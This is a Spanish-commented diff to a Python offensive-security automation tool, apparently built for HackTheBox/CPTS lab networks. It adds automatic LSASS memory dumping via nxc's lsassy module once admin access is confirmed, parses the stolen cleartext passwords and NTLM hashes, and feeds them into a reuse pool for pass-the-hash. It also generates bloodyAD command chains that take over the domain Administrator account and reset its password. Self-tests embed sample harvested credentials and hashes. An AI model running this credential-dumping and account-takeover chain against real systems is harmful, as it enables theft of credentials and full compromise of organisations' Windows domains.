@@ -6350,18 +6350,61 @@ def _parse_nxc_lsa(out):
             "creds": creds, "raw": raw}
 
 
+_LSASSY_PREFIX_RE = re.compile(r"^\s*\S+\s+\S+\s+\d+\s+\S+\s+(.*)$")
+# print_credentials() de nxc/modules/lsassy.py: context.log.highlight(f"{domain}\\{username} {password}")
+# — 'password' es la contraseña en claro o, si no la hay, "LMHASH:NTHASH" (LM casi siempre
+# 'aad3b435b51404eeaad3b435b51404ee', NT el hash real). Dominio puede venir vacío ("").
+_LSASSY_CRED_RE = re.compile(r"^([^\\]*)\\(\S+)\s+(.+)$")
+_LSASSY_HASH_RE = re.compile(r"^[0-9a-fA-F]{32}(:[0-9a-fA-F]{32})?$")
+# write_tickets(): context.log.success(f"Saved {ticket_count} Kerberos ticket(s) to {self.save_dir}")
+# — self.save_dir es una ruta LOCAL (en tu máquina, NXC_PATH/modules/lsassy por defecto), no en el objetivo.
+_LSASSY_TICKETS_RE = re.compile(r"Saved (\d+) Kerberos ticket\(s\) to (\S.*)$")
+
+
+def _parse_lsassy(out):
+    """Credenciales de sesiones ACTIVAS volcadas por `nxc smb ... -M lsassy` (memoria de
+    lsass.exe vía la librería lsassy). Formato confirmado contra el código fuente real del
+    módulo (nxc/modules/lsassy.py, print_credentials/write_tickets) — nxc no repite siempre
+    el prefijo 'PROTO ip puerto host' en cada línea (igual que en _parse_nxc_lsa), así que se
+    intenta quitar y, si no casa, se usa la línea tal cual. Las líneas informativas sin acierto
+    ('No credentials found'/'No Kerberos tickets found'/'No tickets were saved') no llevan
+    '\\' y no casan con nada, así que no cuelan como credencial. Devuelve
+    ([(usuario_completo, secreto, es_hash)], (nº_tickets, ruta_local) | None). Puro → testeable
+    sin red."""
+    creds, tickets = [], None
+    for raw_line in (out or "").splitlines():
+        line = raw_line.rstrip()
+        if not line.strip():
+            continue
+        m = _LSASSY_PREFIX_RE.match(line)
+        payload = m.group(1) if m else line
+        tm = _LSASSY_TICKETS_RE.search(payload)
+        if tm:
+            tickets = (int(tm.group(1)), tm.group(2).strip())
+            continue
+        cm = _LSASSY_CRED_RE.match(payload)
+        if not cm:
+            continue
+        domain, user, secret = cm.group(1), cm.group(2), cm.group(3).strip()
+        full_user = f"{domain}\\{user}" if domain else user
+        creds.append((full_user, secret, bool(_LSASSY_HASH_RE.match(secret))))
+    return creds, tickets
+
+
 def _dump_sam_lsa(res, nxc, ip, u, p, port=None, dp=None, local_auth=False, is_hash=False, pool=None):
     """Tras un Pwn3d! confirmado por SMB (Fase 5d), encadena automáticamente un volcado de
-    SAM (hashes de cuentas locales) y LSA secrets (claves DPAPI, NL$KM, credenciales de
-    servicio en texto claro) con la MISMA credencial que ya demostró ser admin — ya no es
-    "probar si vale", es la cosecha directa que esa admin ya permite (igual que
-    secretsdump.py/crackmapexec a mano). `local_auth` (--local-auth de palantir) replica
-    EXACTAMENTE lo que ya usó el chequeo que dio Pwn3d! segundos antes (el llamante pasa
-    el mismo valor) — en un Windows SUELTO (sin dominio, como el que motivó esta función)
-    nunca hace falta, porque sin dominio nxc ya valida contra la SAM local por defecto;
-    solo importa si el objetivo SÍ está unido a un dominio y la cuenta es local de esa
-    máquina. Solo SMB: --sam/--lsa son módulos del propio nxc smb — no existen en
-    winrm/wmi aunque el Pwn3d! llegara por ahí (el llamante ya filtra por eso)."""
+    SAM (hashes de cuentas locales), LSA secrets (claves DPAPI, NL$KM, credenciales de
+    servicio en texto claro) y memoria de lsass.exe (-M lsassy: credenciales de CUALQUIER
+    sesión activa, local o de dominio) con la MISMA credencial que ya demostró ser admin — ya
+    no es "probar si vale", es la cosecha directa que esa admin ya permite (igual que
+    secretsdump.py/crackmapexec/mimikatz a mano). `local_auth` (--local-auth de palantir)
+    replica EXACTAMENTE lo que ya usó el chequeo que dio Pwn3d! segundos antes (el llamante
+    pasa el mismo valor) — en un Windows SUELTO (sin dominio, como el que motivó esta
+    función) nunca hace falta, porque sin dominio nxc ya valida contra la SAM local por
+    defecto; solo importa si el objetivo SÍ está unido a un dominio y la cuenta es local de
+    esa máquina. Solo SMB: --sam/--lsa/-M lsassy son todos de nxc smb (lsassy declara
+    supported_protocols=["smb"] en su propio código) — ninguno existe en winrm/wmi aunque el
+    Pwn3d! llegara por ahí (el llamante ya filtra por eso)."""
     import tempfile
     pw_file = None
     if p and not is_hash:
@@ -6462,6 +6505,45 @@ def _dump_sam_lsa(res, nxc, ip, u, p, port=None, dp=None, local_auth=False, is_h
             res["findings"].append(("alta", f"LSA: {len(lsa['dpapi'])} clave(s) DPAPI volcada(s) (máquina/usuario) — ver salida cruda del paso"))
         if lsa["nlkm"]:
             res["findings"].append(("alta", "LSA: NL$KM volcada (clave de credenciales de dominio cacheadas)"))
+
+        # lsassy: volcado de MEMORIA de lsass.exe (método por defecto 'comsvcs' = comsvcs.dll
+        # MiniDump). A diferencia de --sam (solo cuentas LOCALES) y --lsa (secretos EN REPOSO:
+        # servicios/DPAPI/NL$KM), esto saca la credencial de CUALQUIER sesión con token activo
+        # en la máquina AHORA MISMO, local o de dominio — si un Domain Admin se conectó por
+        # RDP/consola/servicio y su sesión sigue viva, su hash/contraseña sale aquí. Mucho más
+        # ruidoso que --sam/--lsa (acceso a lsass.exe es de los IOC más vigilados por Defender
+        # ATP/Sysmon Event 10) y puede fallar limpio con Credential Guard o LSA en modo
+        # protegido (RunAsPPL) aunque la cuenta SÍ sea admin real — nxc ya lo encaja como "sin
+        # botín" en ese caso, igual que cualquier otro módulo sin hallazgo.
+        rc3, out3 = run_capture(base_cmd + ["-M", "lsassy"], timeout=180, quiet=True)
+        out3 = out3 or ""
+        lsassy_creds, lsassy_tickets = _parse_lsassy(out3)
+        safe_out3 = out3.replace(p, "***") if p else out3
+        _step(res, shown_base + " -M lsassy", bool(lsassy_creds), safe_out3,
+              note="Pwn3d! por SMB → volcado de MEMORIA de lsass.exe (lsassy): credenciales de cualquier "
+                   "sesión activa en la máquina — MÁS RUIDOSO que --sam/--lsa (IOC vigilado por EDR/Defender); "
+                   "puede fallar limpio con Credential Guard / LSA en modo protegido (RunAsPPL)")
+        for user, secret, cred_is_hash in lsassy_creds:
+            if cred_is_hash:
+                res["findings"].append(("critica",
+                    f"LSASS: hash de sesión activa — «{user}»: {secret}   # pass-the-hash o crackeo offline"))
+            else:
+                res["findings"].append(("critica",
+                    f"LSASS: credencial en TEXTO CLARO de sesión activa — «{user}:{secret}»   # probarla en otros servicios (--creds-file)"))
+        if pool is not None:
+            for user, secret, cred_is_hash in lsassy_creds:
+                bare = re.split(r"[\\/]", user)[-1]   # 'INLANEFREIGHT\\dadmin' → 'dadmin'
+                if bare and not bare.endswith("$"):
+                    _pool_add(pool, bare, secret, cred_is_hash)
+        if "[OPSEC]" in out3:
+            res["findings"].append(("media",
+                "LSASS: lsassy no pudo borrar su fichero de volcado en el objetivo al terminar — "
+                "queda un artefacto de credential dumping en disco (ver salida cruda del paso)"))
+        if lsassy_tickets:
+            n_tk, tk_path = lsassy_tickets
+            res["next"].append(
+                f"ls -la {tk_path}   # lsassy volcó {n_tk} ticket(s) Kerberos de la sesión activa en {ip} "
+                "(guardados en TU máquina, no en el objetivo)")
     finally:
         if pw_file:
             try:
@@ -6500,6 +6582,16 @@ def _add_once(res, sev, text, marker, seen=None):
 # filtrando por PRINCIPAL=<la credencial> (ver _surface_acl_abuse). El dominio (para DCSync) va
 # por TARGET_DN aparte. Confirmado contra el código fuente real de nxc (nxc/modules/daclread.py).
 _ACL_HV_GROUPS = ("Domain Admins", "Enterprise Admins", "Administrators")
+# Cuentas de alto valor auditadas INDIVIDUALMENTE (no solo grupos): control abusable sobre la
+# propia cuenta deja resetearle la contraseña directamente y loguearte como ella — ni falta
+# meterse en ningún grupo. 'Administrator' (la cuenta integrada, normalmente ya en Domain Admins)
+# es el caso real/casi universal en HTB/CPTS — y el propio ejemplo de ayuda de nxc usa justo ese
+# nombre: 'nxc ldap ip -M daclread -o TARGET=Administrator ACTION=read' (confirmado en
+# nxc/modules/daclread.py: TARGET resuelve por sAMAccountName genérico, sirve igual para una
+# cuenta que para un grupo). MVP: NO barre dinámicamente a los miembros ACTUALES de Domain
+# Admins/Enterprise Admins/Administrators (eso necesitaría primero listar cada grupo con
+# --groups y luego auditar cada miembro) — queda como mejora futura documentada.
+_ACL_HV_ACCOUNTS = ("Administrator",)
 # Derechos de una ACE que dan CONTROL del objeto (o permiten meter miembros en un grupo) → abuso.
 # Nombres EXACTOS como los imprime daclread (ACCESS_MASK/SIMPLE_PERMISSIONS de nxc): 'WriteDACL'
 # (no 'WriteDacl'), 'GenericAll', etc.
@@ -6534,27 +6626,39 @@ def _daclread_has_ace(out):
     return bool(_DACLREAD_ACE_RE.search(out or ""))
 
 
-def _acl_abuse_cmds(rights, group, u, secret, is_hash, domain, ip):
-    """Comando(s) bloodyAD para abusar del derecho detectado sobre un grupo de alto valor y
-    acabar como Domain Admin. bloodyAD va por LDAP/NTLM y funciona contra una IP — a diferencia
-    de 'net rpc group addmem', que intenta Kerberos primero y falla con 'Failed to connect to
-    IPC$' contra un target por IP sin FQDN (confirmado en vivo). Pass-the-hash: '-p :<hash>'.
-    El secreto se enmascara (***), igual que el resto de next-steps de _creds_enum. Puro →
+def _acl_abuse_cmds(rights, target, u, secret, is_hash, domain, ip, kind="group"):
+    """Comando(s) bloodyAD para abusar del derecho detectado sobre un objeto de alto valor y
+    acabar con el control total de la cuenta/dominio. bloodyAD va por LDAP/NTLM y funciona
+    contra una IP — a diferencia de 'net rpc group addmem', que intenta Kerberos primero y
+    falla con 'Failed to connect to IPC$' contra un target por IP sin FQDN (confirmado en
+    vivo). Pass-the-hash: '-p :<hash>'. El secreto se enmascara (***), igual que el resto de
+    next-steps de _creds_enum.
+
+    `kind`: 'group' (el objetivo es un grupo de alto valor: Domain Admins/Enterprise Admins/
+    Administrators → meterse en el grupo, el paso final es `add groupMember`) o 'account' (el
+    objetivo es una CUENTA de alto valor, p. ej. 'Administrator' → resetearle la contraseña
+    DIRECTAMENTE con `set password` — ni falta pasar por ningún grupo; es el camino que de
+    verdad siguió un operador en vivo, y antes esta auditoría solo cubría grupos). Puro →
     testeable sin red."""
     cred = f"-u {shlex.quote(u)} -p " + ("':***'" if is_hash else "'***'")   # bloodyAD: hash → -p :hash
     base = f"bloodyAD --host {ip} -d {domain} {cred}"
-    g = shlex.quote(group)
+    tq = shlex.quote(target)
     uq = shlex.quote(u)
-    addmem = f"{base} add groupMember {g} {uq}   # te metes en '{group}' (ya eres de facto Domain Admin)"
+    if kind == "account":
+        step_tag = "le pones la contraseña que quieras a"
+        final = f"{base} set password {tq} 'NuevaPass123!'   # {step_tag} '{target}' y te logueas como ella"
+    else:
+        step_tag = "te metes en"
+        final = f"{base} add groupMember {tq} {uq}   # {step_tag} '{target}' (ya eres de facto Domain Admin)"
     if "WriteOwner" in rights:
-        return [f"{base} set owner {g} {uq}   # 1) WriteOwner: te haces dueño del grupo",
-                f"{base} add genericAll {g} {uq}   # 2) ya como dueño, te das GenericAll",
-                addmem.replace("# te metes", "# 3) te metes")]
+        return [f"{base} set owner {tq} {uq}   # 1) WriteOwner: te haces dueño de '{target}'",
+                f"{base} add genericAll {tq} {uq}   # 2) ya como dueño, te das GenericAll",
+                final.replace(f"# {step_tag}", f"# 3) {step_tag}")]
     if "WriteDACL" in rights and not any(r in rights for r in ("GenericAll", "FullControl", "GenericWrite", "WriteProperties", "Self")):
-        return [f"{base} add genericAll {g} {uq}   # 1) WriteDACL: te concedes GenericAll sobre el grupo",
-                addmem.replace("# te metes", "# 2) te metes")]
-    # GenericAll/FullControl/GenericWrite/WriteProperties/Self → meter miembro directo (1 paso)
-    return [addmem]
+        return [f"{base} add genericAll {tq} {uq}   # 1) WriteDACL: te concedes GenericAll sobre '{target}'",
+                final.replace(f"# {step_tag}", f"# 2) {step_tag}")]
+    # GenericAll/FullControl/GenericWrite/WriteProperties/Self → acción directa (1 paso)
+    return [final]
 
 
 def _surface_acl_abuse(res, nxc, ip, u, secret, is_hash, domain, base_dn, auth_args, shown_auth, seen):
@@ -6565,6 +6669,10 @@ def _surface_acl_abuse(res, nxc, ip, u, secret, is_hash, domain, base_dn, auth_a
          (volcar todos los hashes sin ser admin).
       2) GenericAll/WriteDACL/WriteOwner/GenericWrite/WriteProperties/Self sobre Domain Admins /
          Enterprise Admins / Administrators → escalada directa (meterse en el grupo).
+      3) Lo mismo pero sobre la CUENTA 'Administrator' (no un grupo) → resetarle la contraseña
+         directamente y loguearte como ella, sin pasar por ningún grupo — el camino que de
+         verdad siguió un operador en vivo tras ver el hallazgo de (2) sobre 'Enterprise Admins'/
+         'Administrators': esta auditoría solo miraba grupos, nunca cuentas individuales.
     Cada hallazgo es CRÍTICO y lleva el comando concreto de abuso (bloodyAD; ver _acl_abuse_cmds).
     SOLO LECTURA: daclread solo LEE la DACL; el abuso queda como next-step MANUAL, igual que
     Zerologon/noPac. Caso real que lo motivó: CT059 tenía GenericAll sobre Domain Admins (era la
@@ -6599,6 +6707,22 @@ def _surface_acl_abuse(res, nxc, ip, u, secret, is_hash, domain, base_dn, auth_a
                 f"AD (cred {u}): «{u}» tiene {', '.join(rights)} sobre '{grp}' → escalada DIRECTA a {grp} "
                 "(meterse en el grupo) — la ruta que normalmente hay que buscar con BloodHound a mano", f"ACL {grp}", seen):
             for c in _acl_abuse_cmds(rights, grp, u, secret, is_hash, domain, ip):
+                res["next"].append(c)
+    # 3) Control abusable sobre CUENTAS de alto valor (no solo grupos): con control sobre la
+    # propia cuenta 'Administrator' no hace falta meterte en ningún grupo, le reseteas la
+    # contraseña y entras directamente como ella.
+    for acc in _ACL_HV_ACCOUNTS:
+        rc, out = _dacl([f"TARGET={acc}", f"PRINCIPAL={u}", "ACTION=read"])
+        rights = _parse_daclread_rights(out)
+        _step(res, f"{nxc} ldap {ip} {shown_auth} -M daclread -o TARGET={shlex.quote(acc)} PRINCIPAL={u}",
+              bool(rights), _m(out),
+              note=f"¿esta credencial tiene control abusable (GenericAll/WriteDACL/WriteOwner/…) sobre la CUENTA "
+                   f"'{acc}'? → resetarle la contraseña y entrar directamente como ella, sin pasar por ningún grupo")
+        if rights and _add_once(res, "critica",
+                f"AD (cred {u}): «{u}» tiene {', '.join(rights)} sobre la cuenta '{acc}' → resetear su "
+                "contraseña DIRECTAMENTE y entrar como ella (no hace falta meterse en ningún grupo)",
+                f"ACL cuenta {acc}", seen):
+            for c in _acl_abuse_cmds(rights, acc, u, secret, is_hash, domain, ip, kind="account"):
                 res["next"].append(c)
 
 
@@ -10063,6 +10187,23 @@ def selftest():
     _h_cmds = _acl_abuse_cmds(["GenericAll"], "Domain Admins", "CT059", "ignored", True, "inlanefreight.local", "172.16.7.3")
     assert "-p ':***'" in _h_cmds[0]   # PtH: bloodyAD -p :hash (enmascarado)
 
+    # _acl_abuse_cmds con kind="account": el objetivo es una CUENTA (p. ej. 'Administrator'),
+    # no un grupo → el paso final es 'set password', NUNCA 'add groupMember' — caso real: el
+    # operador detectó el control sobre un grupo pero el camino que de verdad siguió fue
+    # resetearle la contraseña a la cuenta 'Administrator' directamente.
+    _acc_ga = _acl_abuse_cmds(["GenericAll"], "Administrator", "CT059", "charlie1", False, "inlanefreight.local", "172.16.7.3", kind="account")
+    assert len(_acc_ga) == 1 and "set password Administrator 'NuevaPass123!'" in _acc_ga[0]
+    assert "add groupMember" not in _acc_ga[0]
+    _acc_wd = _acl_abuse_cmds(["WriteDACL"], "Administrator", "CT059", "charlie1", False, "inlanefreight.local", "172.16.7.3", kind="account")
+    assert len(_acc_wd) == 2 and "add genericAll" in _acc_wd[0] and "set password" in _acc_wd[1]
+    assert "# 1)" in _acc_wd[0] and "# 2)" in _acc_wd[1]
+    _acc_wo = _acl_abuse_cmds(["WriteOwner"], "Administrator", "CT059", "charlie1", False, "inlanefreight.local", "172.16.7.3", kind="account")
+    assert len(_acc_wo) == 3 and "set owner" in _acc_wo[0] and "set password" in _acc_wo[2]
+    assert "# 1)" in _acc_wo[0] and "# 2)" in _acc_wo[1] and "# 3)" in _acc_wo[2]
+    # kind="group" (por defecto, sin pasarlo) sigue dando EXACTAMENTE el texto de siempre —
+    # no se rompe nada para los llamantes existentes.
+    assert _acl_abuse_cmds(["GenericAll"], "Domain Admins", "CT059", "charlie1", False, "inlanefreight.local", "172.16.7.3") == _ga_cmds
+
     # _surface_acl_abuse (cableo): DCSync sobre el dominio + GenericAll sobre Domain Admins →
     # DOS críticas + los comandos de abuso (secretsdump / bloodyAD). Caso real: CT059.
     _real_rcr_acl = _run_capture_retry
@@ -10076,7 +10217,12 @@ def selftest():
         if "TARGET=Domain Admins" in s:
             return 0, ("LDAP x 389 DC ACE[5] info\nLDAP x 389 DC \tAccess mask               : GenericAll (0x10000000)\n"
                        "LDAP x 389 DC \tTrustee (SID)             : DOM\\CT059 (S-1-5-21-1-2-3-1130)")
-        return 0, "LDAP x 389 DC [*] sin ACE para este principal"   # Enterprise Admins / Administrators
+        # token EXACTO de la lista (no substring de 'TARGET=Administrators', el grupo plural, que
+        # SÍ contendría 'TARGET=Administrator' si se mirara como substring de 's' — de ahí 'in cmd').
+        if "TARGET=Administrator" in cmd:
+            return 0, ("LDAP x 389 DC ACE[7] info\nLDAP x 389 DC \tAccess mask               : WriteDACL (0x40000)\n"
+                       "LDAP x 389 DC \tTrustee (SID)             : DOM\\CT059 (S-1-5-21-1-2-3-1130)")
+        return 0, "LDAP x 389 DC [*] sin ACE para este principal"   # Enterprise Admins / Administrators (grupo)
     globals()["_run_capture_retry"] = _fake_daclread
     _acl_res = _fp("reuse-ldap", "x", [389])
     try:
@@ -10088,10 +10234,14 @@ def selftest():
     _acl_crit = [t for s, t in _acl_res["findings"] if s == "critica"]
     assert any("DCSync viable" in t and "CT059" in t for t in _acl_crit), _acl_crit
     assert any("GenericAll" in t and "Domain Admins" in t and "escalada DIRECTA" in t for t in _acl_crit), _acl_crit
+    # la CUENTA 'Administrator' (no un grupo): WriteDACL → hallazgo propio + comando 'set password',
+    # nunca 'add groupMember' — esto es justo lo que antes NO se detectaba (solo miraba grupos).
+    assert any("Administrator" in t and "WriteDACL" in t and "resetear su contraseña" in t for t in _acl_crit), _acl_crit
     _acl_next = " ".join(_acl_res["next"])
     assert "impacket-secretsdump -just-dc inlanefreight.local/CT059" in _acl_next
     assert "bloodyAD --host 172.16.7.3 -d inlanefreight.local" in _acl_next
     assert "add groupMember 'Domain Admins' CT059" in _acl_next and "net rpc" not in _acl_next
+    assert "set password Administrator 'NuevaPass123!'" in _acl_next   # cadena de abuso de la cuenta, 2 pasos (WriteDACL)
     # _secretsdump_hash: DCSync-rights check (secretsdump.py -just-dc-user krbtgt) — mismo
     # formato 'usuario:RID:lm:nt:::' que _parse_nxc_sam; sin derechos, la cuenta pedida NUNCA
     # aparece en la salida (se queda en el error RPC de la fase DRSUAPI, no en una línea vacía).
@@ -10331,6 +10481,25 @@ def selftest():
     assert _lr["raw"] == []                                # nada mal clasificado como basura
     # y lo más importante: ninguna línea DCC2/máquina se coló como credencial cleartext
     assert not any("$DCC2$" in s or "MS01$" in u or "aes" in s[:4] for u, s in _lr["creds"])
+
+    # _parse_lsassy: formato REAL de nxc/modules/lsassy.py (print_credentials/write_tickets,
+    # confirmado contra el código fuente) — una sesión con contraseña en claro (mssqlsvc) y
+    # otra solo con hash (jmontgomery, LM:NT) deben separarse por 'is_hash'; sin tickets.
+    _lsassy_out = (
+        "SMB  172.16.6.50  445  MS01  [*] Dumping lsass with comsvcs method\n"
+        "SMB  172.16.6.50  445  MS01  INLANEFREIGHT.LOCAL\\mssqlsvc D@ta_bAse_adm1n!\n"
+        "SMB  172.16.6.50  445  MS01  INLANEFREIGHT.LOCAL\\jmontgomery aad3b435b51404eeaad3b435b51404ee:7a21990fcd3d759941e45c490f143d5f\n"
+        "SMB  172.16.6.50  445  MS01  No Kerberos tickets found\n"
+    )
+    _lcreds, _ltickets = _parse_lsassy(_lsassy_out)
+    assert ("INLANEFREIGHT.LOCAL\\mssqlsvc", "D@ta_bAse_adm1n!", False) in _lcreds
+    assert ("INLANEFREIGHT.LOCAL\\jmontgomery",
+            "aad3b435b51404eeaad3b435b51404ee:7a21990fcd3d759941e45c490f143d5f", True) in _lcreds
+    assert _ltickets is None
+    assert _parse_lsassy("SMB 10.0.0.1 445 H No credentials found\n") == ([], None)
+    assert _parse_lsassy("") == ([], None)
+    _, _ltk = _parse_lsassy("SMB  172.16.6.50  445  MS01  Saved 2 Kerberos ticket(s) to /home/op/.nxc/modules/lsassy\n")
+    assert _ltk == (2, "/home/op/.nxc/modules/lsassy")
 
     # roasting (nxc --asreproast/--kerberoasting) y spider de contenido: parsers puros (sin red)
     assert _count_roast("$krb5asrep$23$u@DOM:abc\n$krb5tgs$23$*svc$DOM$def") == 2
@@ -11079,11 +11248,12 @@ def selftest():
     assert sum("usuarios del dominio" in t for _, t in _ad_ldap["findings"]) == 0   # ya lo puso SMB: LDAP no lo repite
 
     # _dump_sam_lsa: mockeando nxc_bin/run_capture con esas MISMAS salidas reales, comprueba
-    # que llama a 'nxc smb ip -u ... -p ... --sam' y '--lsa' (sin --local-auth: reutiliza
-    # tal cual la autenticación que ya dio Pwn3d!), que la contraseña del operador queda
-    # enmascarada en el output guardado pero el hash/secreto DESCUBIERTO no (es la entrega),
-    # y que las severidades son las esperadas (cuenta con hash vacío y LSA en texto claro
-    # → crítica; hash NTLM normal → alta).
+    # que llama a 'nxc smb ip -u ... -p ... --sam', '--lsa' y '-M lsassy' (sin --local-auth:
+    # reutiliza tal cual la autenticación que ya dio Pwn3d!), que la contraseña del operador
+    # queda enmascarada en el output guardado pero el hash/secreto DESCUBIERTO no (es la
+    # entrega), y que las severidades son las esperadas (cuenta con hash vacío y LSA en texto
+    # claro → crítica; hash NTLM normal → alta). Sin sesión activa en este fixture → lsassy
+    # responde "No credentials found" (sin acierto, ni ruido en el pool).
     _real_nxc_bin3, _real_run_capture3 = nxc_bin, run_capture
     _dump_cmds = []
 
@@ -11093,6 +11263,8 @@ def selftest():
             return 0, _sam_out
         if "--lsa" in cmd:
             return 0, _lsa_out
+        if "-M" in cmd and "lsassy" in cmd:
+            return 0, "SMB  10.129.4.104  445  FRONTDESK01  No credentials found\n"
         raise AssertionError(f"comando nxc inesperado en _dump_sam_lsa: {cmd}")
 
     globals()["nxc_bin"], globals()["run_capture"] = (lambda: "FAKE_NXC"), _fake_dump_run_capture
@@ -11101,7 +11273,7 @@ def selftest():
         _dump_sam_lsa(_dres, "FAKE_NXC", "10.129.4.104", "bob", "HTB_@cademy_stdnt!")
     finally:
         globals()["nxc_bin"], globals()["run_capture"] = _real_nxc_bin3, _real_run_capture3
-    assert len(_dump_cmds) == 2 and "--local-auth" not in _dump_cmds[0] and "--local-auth" not in _dump_cmds[1]
+    assert len(_dump_cmds) == 3 and all("--local-auth" not in c for c in _dump_cmds)   # --sam/--lsa/-M lsassy
     assert all("HTB_@cademy_stdnt!" not in " ".join(c) for c in _dump_cmds)   # la contraseña nunca va en el argv
     _dsteps_out = " ".join(s["output"] for s in _dres["steps"])
     assert "HTB_@cademy_stdnt!" not in _dsteps_out   # la contraseña del operador, enmascarada
@@ -11112,16 +11284,16 @@ def selftest():
     assert any(s == "critica" and "frontdesk:Password123" in t for s, t in _dfindings)
     assert any(s == "alta" and "DPAPI" in t for s, t in _dfindings)
 
-    # --local-auth (palantir): _dump_sam_lsa lo añade a AMBAS llamadas (--sam/--lsa) cuando
-    # se pide explícitamente — reutiliza el mismo mock de arriba, _dump_cmds ya tiene los
-    # 2 comandos SIN la flag; estos 2 nuevos van al final de la misma lista.
+    # --local-auth (palantir): _dump_sam_lsa lo añade a las 3 llamadas (--sam/--lsa/-M lsassy)
+    # cuando se pide explícitamente — reutiliza el mismo mock de arriba, _dump_cmds ya tiene
+    # los 3 comandos SIN la flag; estos 3 nuevos van al final de la misma lista.
     globals()["nxc_bin"], globals()["run_capture"] = (lambda: "FAKE_NXC"), _fake_dump_run_capture
     try:
         _dres3 = _fp("reuse", "test", [445])
         _dump_sam_lsa(_dres3, "FAKE_NXC", "10.129.4.104", "bob", "HTB_@cademy_stdnt!", local_auth=True)
     finally:
         globals()["nxc_bin"], globals()["run_capture"] = _real_nxc_bin3, _real_run_capture3
-    assert "--local-auth" in _dump_cmds[-2] and "--local-auth" in _dump_cmds[-1]
+    assert all("--local-auth" in c for c in _dump_cmds[-3:])
 
     # _dump_sam_lsa con pool=: alimenta la retroalimentación con lo DESCUBIERTO (cred LSA en claro
     # 'frontdesk:Password123' + hash NTLM de SAM de 'bob' para pass-the-hash).
@@ -11133,6 +11305,27 @@ def selftest():
         globals()["nxc_bin"], globals()["run_capture"] = _real_nxc_bin3, _real_run_capture3
     assert any(c["user"] == "frontdesk" and c["secret"] == "Password123" and not c["is_hash"] for c in _pool_t)
     assert any(c["is_hash"] and c["user"] == "bob" for c in _pool_t)
+
+    # _dump_sam_lsa / lsassy: si nxc no logra borrar su propio fichero de volcado en el objetivo
+    # ('[OPSEC] Failed to delete...', nxc/modules/lsassy.py, context.log.fail), eso es un hallazgo
+    # propio (artefacto de credential dumping dejado atrás) — independiente de si hubo credenciales.
+    def _fake_dump_opsec(cmd, timeout=None, quiet=False, **kw):
+        if "--sam" in cmd:
+            return 0, _sam_out
+        if "--lsa" in cmd:
+            return 0, _lsa_out
+        if "-M" in cmd and "lsassy" in cmd:
+            return 0, ("SMB  10.129.4.104  445  FRONTDESK01  No credentials found\n"
+                        "SMB  10.129.4.104  445  FRONTDESK01  [-] [OPSEC] Failed to delete lsassy dumper file: "
+                        "C$\\Windows\\Temp\\xyz123.tmp\n")
+        raise AssertionError(f"comando inesperado: {cmd}")
+    globals()["nxc_bin"], globals()["run_capture"] = (lambda: "FAKE_NXC"), _fake_dump_opsec
+    try:
+        _dres_opsec = _fp("reuse", "test", [445])
+        _dump_sam_lsa(_dres_opsec, "FAKE_NXC", "10.129.4.104", "bob", "HTB_@cademy_stdnt!")
+    finally:
+        globals()["nxc_bin"], globals()["run_capture"] = _real_nxc_bin3, _real_run_capture3
+    assert any(s == "media" and "artefacto" in t and "disco" in t for s, t in _dres_opsec["findings"])
 
     # _dump_sam_lsa con el volcado LSA REAL (_lsa_real, MS01/INLANEFREIGHT): comprueba de punta a
     # punta que SOLO la credencial cleartext de tpetty entra al pool (con el prefijo 'DOMINIO\\'
@@ -11154,6 +11347,8 @@ def selftest():
             return 0, _sam_real
         if "--lsa" in cmd:
             return 0, _lsa_real
+        if "-M" in cmd and "lsassy" in cmd:
+            return 0, _lsassy_out   # mssqlsvc en claro + jmontgomery solo con hash (fixture ya definido arriba)
         raise AssertionError(f"comando inesperado: {cmd}")
     globals()["nxc_bin"], globals()["run_capture"] = (lambda: "FAKE_NXC"), _fake_dump_real
     _pool_real, _dres_real = [], _fp("reuse", "t", [445])
@@ -11175,6 +11370,19 @@ def selftest():
     # Guest/DefaultAccount con hash vacío: 'info', nunca 'critica' (antes eran 2 falsos critica/host)
     assert not any(s == "critica" and ("Guest" in t or "DefaultAccount" in t) for s, t in _dres_real["findings"])
     assert any(s == "info" and "DefaultAccount" in t and "DESHABILITADA" in t for s, t in _dres_real["findings"])
+    # lsassy (misma llamada, _lsassy_out): sesión activa de mssqlsvc (en claro) y jmontgomery
+    # (solo hash) — AMBAS 'critica' (es LSASS: cualquiera de las dos es una sesión de dominio
+    # viva), y AMBAS al pool de retroalimentación con is_hash correcto para cada una.
+    assert any(s == "critica" and "mssqlsvc" in t and "D@ta_bAse_adm1n!" in t for s, t in _dres_real["findings"])
+    assert any(s == "critica" and "jmontgomery" in t
+               and "aad3b435b51404eeaad3b435b51404ee:7a21990fcd3d759941e45c490f143d5f" in t
+               for s, t in _dres_real["findings"])
+    assert any(c["user"] == "mssqlsvc" and c["secret"] == "D@ta_bAse_adm1n!" and not c["is_hash"] for c in _pool_real)
+    assert any(c["user"] == "jmontgomery" and c["is_hash"]
+               and c["secret"] == "aad3b435b51404eeaad3b435b51404ee:7a21990fcd3d759941e45c490f143d5f"
+               for c in _pool_real)
+    # sin '[OPSEC]' en este fixture → sin el hallazgo de artefacto dejado atrás
+    assert not any(s == "media" and "artefacto" in t for s, t in _dres_real["findings"])
 
     # _pool_add deduplica
     _pp = []
@@ -11342,7 +11550,7 @@ def selftest():
     def _make_fake_run_capture(seen):
         def _fake_run_capture(cmd, timeout=None, quiet=False, **kw):
             seen.append((cmd, timeout, quiet))
-            if "--sam" in cmd or "--lsa" in cmd:
+            if "--sam" in cmd or "--lsa" in cmd or ("-M" in cmd and "lsassy" in cmd):
                 return 1, "SMB 10.0.0.1 445 DC01 [-] STATUS_LOGON_FAILURE"
             # -u apunta a un fichero de verdad SOLO en la llamada bulk (userfile); en la
             # explícita (--creds-file, más abajo) o en _creds_enum, -u es el usuario literal
@@ -11368,7 +11576,7 @@ def selftest():
     finally:
         globals()["nxc_bin"], globals()["run_capture"] = _real_nxc_bin2, _real_run_capture
         globals()["_run_capture_progressive"] = _real_rcp_bulk
-    assert len(_seen_cmds) == 8   # 1 spray + 2 del volcado SAM/LSA + 5 de _creds_enum (--shares/--users/--pass-pol/--rid-brute/--loggedon-users, ya sin gate is_dc) — todo por el Pwn3d! de alice
+    assert len(_seen_cmds) == 9   # 1 spray + 3 del volcado SAM/LSA/-M lsassy + 5 de _creds_enum (--shares/--users/--pass-pol/--rid-brute/--loggedon-users, ya sin gate is_dc) — todo por el Pwn3d! de alice
     _cmd, _timeout, _quiet = _seen_cmds[0]
     assert _quiet is True and "--continue-on-success" in _cmd and "--no-bruteforce" not in _cmd
     assert _timeout and _timeout > 0
@@ -11401,10 +11609,10 @@ def selftest():
